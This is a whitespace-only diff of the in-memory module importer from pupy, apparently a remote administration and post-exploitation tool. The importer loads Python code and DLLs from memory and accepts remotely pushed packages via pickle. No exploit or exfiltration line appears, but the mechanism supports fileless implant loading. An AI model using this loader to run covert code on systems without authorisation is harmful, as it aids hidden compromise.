@@ -18,159 +18,159 @@
 import sys, imp, zlib, marshal
 builtin_memimporter=False
 try:
-	import _memimporter
-	builtin_memimporter=True
+    import _memimporter
+    builtin_memimporter=True
 except ImportError:
-	pass
-	
+    pass
+    
 modules={}
 try:
-	import pupy
-	if not (hasattr(pupy, 'pseudo') and pupy.pseudo):
-		modules = marshal.loads(zlib.decompress(pupy._get_compressed_library_string()))
+    import pupy
+    if not (hasattr(pupy, 'pseudo') and pupy.pseudo):
+        modules = marshal.loads(zlib.decompress(pupy._get_compressed_library_string()))
 except ImportError:
-	#modules = marshal.loads(zlib.decompress(open("resources\\library_compressed_string.txt",'rb').read()))
-	pass
+    #modules = marshal.loads(zlib.decompress(open("resources\\library_compressed_string.txt",'rb').read()))
+    pass
 
 def get_module_files(fullname):
-	""" return the file to load """
-	global modules
-	f=fullname.replace(".","/")
-	files=[]
-	for x in modules.iterkeys():
-		if x.rsplit(".",1)[0]==f or f+"/__init__.py"==x or f+"/__init__.pyc"==x or f+"/__init__.pyo"==x:
-			files.append(x)
-	return files
+    """ return the file to load """
+    global modules
+    f=fullname.replace(".","/")
+    files=[]
+    for x in modules.iterkeys():
+        if x.rsplit(".",1)[0]==f or f+"/__init__.py"==x or f+"/__init__.pyc"==x or f+"/__init__.pyo"==x:
+            files.append(x)
+    return files
 
 def pupy_add_package(pkdic):
-	""" update the modules dictionary to allow remote imports of new packages """
-	import cPickle
-	global modules
-	modules.update(cPickle.loads(pkdic))
+    """ update the modules dictionary to allow remote imports of new packages """
+    import cPickle
+    global modules
+    modules.update(cPickle.loads(pkdic))
 
 class PupyPackageLoader:
-	def __init__(self, fullname, contents, extension, is_pkg, path):
-		self.fullname = fullname
-		self.contents = contents
-		self.extension = extension
-		self.is_pkg=is_pkg
-		self.path=path
-		self.archive="" #need this attribute
+    def __init__(self, fullname, contents, extension, is_pkg, path):
+        self.fullname = fullname
+        self.contents = contents
+        self.extension = extension
+        self.is_pkg=is_pkg
+        self.path=path
+        self.archive="" #need this attribute
 
-	def load_module(self, fullname):
-		imp.acquire_lock()
-		try:
-			#print "loading module %s"%fullname
-			if fullname in sys.modules:
-				return sys.modules[fullname]
-			mod=None
-			c=None
-			if self.extension=="py":
-				mod = imp.new_module(fullname)
-				mod.__name__ = fullname
-				mod.__file__ = "<memimport>\\%s" % self.path.replace("/","\\")
-				mod.__loader__ = self
-				if self.is_pkg:
-					mod.__path__ = [mod.__file__.rsplit("\\",1)[0]]
-					mod.__package__ = fullname
-				else:
-					mod.__package__ = fullname.rsplit('.', 1)[0]
-				sys.modules[fullname]=mod
-				code = compile(self.contents, mod.__file__, "exec")
-				exec code in mod.__dict__
-			elif self.extension in ["pyc","pyo"]:
-				mod = imp.new_module(fullname)
-				mod.__name__ = fullname
-				mod.__file__ = "<memimport>\\%s" % self.path.replace("/","\\")
-				mod.__loader__ = self
-				if self.is_pkg:
-					mod.__path__ = [mod.__file__.rsplit("\\",1)[0]]
-					mod.__package__ = fullname
-				else:
-					mod.__package__ = fullname.rsplit('.', 1)[0]
-				sys.modules[fullname]=mod
-				c=marshal.loads(self.contents[8:])
-				exec c in mod.__dict__
-			elif self.extension in ("dll","pyd"):
-				initname = "init" + fullname.rsplit(".",1)[-1]
-				path=fullname.replace(".","/")+"."+self.extension
-				#print "Loading %s from memory"%fullname
-				#print "init:%s, %s.%s"%(initname,fullname,self.extension)
-				mod = _memimporter.import_module(self.contents, initname, fullname, path)
-				mod.__name__=fullname
-				mod.__file__ = "<memimport>\\%s" % self.path.replace("/","\\")
-				mod.__loader__ = self
-				mod.__package__ = fullname.rsplit('.',1)[0]
-				sys.modules[fullname]=mod
-		except Exception as e:
-			if fullname in sys.modules:
-				del sys.modules[fullname]
-			import traceback
-			print "PupyPackageLoader: Error while loading package %s (%s) : %s"%(fullname, self.extension, str(e))
-			raise e
-		finally:
-			imp.release_lock()
-		mod = sys.modules[fullname] # reread the module in case it changed itself
-		return mod
+    def load_module(self, fullname):
+        imp.acquire_lock()
+        try:
+            #print "loading module %s"%fullname
+            if fullname in sys.modules:
+                return sys.modules[fullname]
+            mod=None
+            c=None
+            if self.extension=="py":
+                mod = imp.new_module(fullname)
+                mod.__name__ = fullname
+                mod.__file__ = "<memimport>\\%s" % self.path.replace("/","\\")
+                mod.__loader__ = self
+                if self.is_pkg:
+                    mod.__path__ = [mod.__file__.rsplit("\\",1)[0]]
+                    mod.__package__ = fullname
+                else:
+                    mod.__package__ = fullname.rsplit('.', 1)[0]
+                sys.modules[fullname]=mod
+                code = compile(self.contents, mod.__file__, "exec")
+                exec code in mod.__dict__
+            elif self.extension in ["pyc","pyo"]:
+                mod = imp.new_module(fullname)
+                mod.__name__ = fullname
+                mod.__file__ = "<memimport>\\%s" % self.path.replace("/","\\")
+                mod.__loader__ = self
+                if self.is_pkg:
+                    mod.__path__ = [mod.__file__.rsplit("\\",1)[0]]
+                    mod.__package__ = fullname
+                else:
+                    mod.__package__ = fullname.rsplit('.', 1)[0]
+                sys.modules[fullname]=mod
+                c=marshal.loads(self.contents[8:])
+                exec c in mod.__dict__
+            elif self.extension in ("dll","pyd"):
+                initname = "init" + fullname.rsplit(".",1)[-1]
+                path=fullname.replace(".","/")+"."+self.extension
+                #print "Loading %s from memory"%fullname
+                #print "init:%s, %s.%s"%(initname,fullname,self.extension)
+                mod = _memimporter.import_module(self.contents, initname, fullname, path)
+                mod.__name__=fullname
+                mod.__file__ = "<memimport>\\%s" % self.path.replace("/","\\")
+                mod.__loader__ = self
+                mod.__package__ = fullname.rsplit('.',1)[0]
+                sys.modules[fullname]=mod
+        except Exception as e:
+            if fullname in sys.modules:
+                del sys.modules[fullname]
+            import traceback
+            print "PupyPackageLoader: Error while loading package %s (%s) : %s"%(fullname, self.extension, str(e))
+            raise e
+        finally:
+            imp.release_lock()
+        mod = sys.modules[fullname] # reread the module in case it changed itself
+        return mod
 
 class PupyPackageFinder:
-	def __init__(self, modules):
-		self.modules = modules
-		self.modules_list=[x.rsplit(".",1)[0] for x in self.modules.iterkeys()]
+    def __init__(self, modules):
+        self.modules = modules
+        self.modules_list=[x.rsplit(".",1)[0] for x in self.modules.iterkeys()]
 
-	def find_module(self, fullname, path=None):
-		imp.acquire_lock()
-		try:
-			if fullname in ("pywintypes", "pythoncom"):
-				fullname = fullname + "%d%d" % sys.version_info[:2]
-				fullname = fullname.replace(".", "\\") + ".dll"
-			#print "find_module(\"%s\",\"%s\")"%(fullname,path)
-			files=get_module_files(fullname)
-			if not builtin_memimporter:
-				files=[f for f in files if not f.lower().endswith((".pyd",".dll"))]
-			if not files:
-				#print "%s not found in %s"%(fullname,path)
-				return None
-			selected=None
-			for f in files:
-				if f.endswith("/__init__.pyc") or f.endswith("/__init__.py") or f.endswith("/__init__.pyo"):
-					selected=f # we select packages in priority
-			if not selected:
-				for f in files:
-					if f.endswith(".pyd"):
-						selected=f # then we select pyd
-			if not selected:
-				for f in files:
-					if f.endswith(".py"):
-						selected=f # we select .py before .pyc
-			if not selected:
-				selected=files[0]
+    def find_module(self, fullname, path=None):
+        imp.acquire_lock()
+        try:
+            if fullname in ("pywintypes", "pythoncom"):
+                fullname = fullname + "%d%d" % sys.version_info[:2]
+                fullname = fullname.replace(".", "\\") + ".dll"
+            #print "find_module(\"%s\",\"%s\")"%(fullname,path)
+            files=get_module_files(fullname)
+            if not builtin_memimporter:
+                files=[f for f in files if not f.lower().endswith((".pyd",".dll"))]
+            if not files:
+                #print "%s not found in %s"%(fullname,path)
+                return None
+            selected=None
+            for f in files:
+                if f.endswith("/__init__.pyc") or f.endswith("/__init__.py") or f.endswith("/__init__.pyo"):
+                    selected=f # we select packages in priority
+            if not selected:
+                for f in files:
+                    if f.endswith(".pyd"):
+                        selected=f # then we select pyd
+            if not selected:
+                for f in files:
+                    if f.endswith(".py"):
+                        selected=f # we select .py before .pyc
+            if not selected:
+                selected=files[0]
 
-			#print "%s found in %s"%(fullname,selected)
-			content=self.modules[selected]
-			extension=selected.rsplit(".",1)[1].strip().lower()
-			is_pkg=False
-			if selected.endswith("/__init__.py") or selected.endswith("/__init__.pyc") or selected.endswith("/__init__.pyo"):
-				is_pkg=True
-			#print "--> Loading %s(%s).%s is_package:%s"%(fullname,selected,extension, is_pkg)
-			return PupyPackageLoader(fullname, content, extension, is_pkg, selected)
-		except Exception as e:
-			raise e
-		finally:
-			imp.release_lock()
+            #print "%s found in %s"%(fullname,selected)
+            content=self.modules[selected]
+            extension=selected.rsplit(".",1)[1].strip().lower()
+            is_pkg=False
+            if selected.endswith("/__init__.py") or selected.endswith("/__init__.pyc") or selected.endswith("/__init__.pyo"):
+                is_pkg=True
+            #print "--> Loading %s(%s).%s is_package:%s"%(fullname,selected,extension, is_pkg)
+            return PupyPackageLoader(fullname, content, extension, is_pkg, selected)
+        except Exception as e:
+            raise e
+        finally:
+            imp.release_lock()
 
 def load_pywintypes():
-	#loading pywintypes27.dll :-)
-	global modules
-	try:
-		import pupy
-		pupy.load_dll("pywintypes27.dll", modules["pywintypes27.dll"])
-	except Exception as e:
-		print e
-		pass
+    #loading pywintypes27.dll :-)
+    global modules
+    try:
+        import pupy
+        pupy.load_dll("pywintypes27.dll", modules["pywintypes27.dll"])
+    except Exception as e:
+        print e
+        pass
 
 def install():
-	sys.meta_path.append(PupyPackageFinder(modules))
-	sys.path_importer_cache.clear()
+    sys.meta_path.append(PupyPackageFinder(modules))
+    sys.path_importer_cache.clear()
 
 
